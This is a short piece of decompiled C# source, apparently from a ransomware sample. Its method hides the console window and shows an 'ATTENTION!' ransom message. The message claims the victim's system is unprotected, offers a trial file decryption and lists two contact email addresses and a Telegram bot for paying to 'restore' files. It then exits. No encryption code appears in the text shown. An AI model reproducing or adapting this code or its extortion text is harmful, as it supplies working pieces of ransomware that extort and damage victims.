using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Fast;

internal class EAF
{
	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void None()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		MessageBox.Show("At the moment, your system is not protected.\nWe can fix it and restore files.\nTo get started, send a file to decrypt trial.\nYou can trust us after opening the test file.\nTo restore the system write to this address:\n\nEmail 1: dr.help100@mailfence.com\nEmail 2: decrypterdr@cyberfear.com\n\nTelegram ID: @EAF_SUPPORT_BOT", "ATTENTION!", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Environment.Exit(0);
	}
}
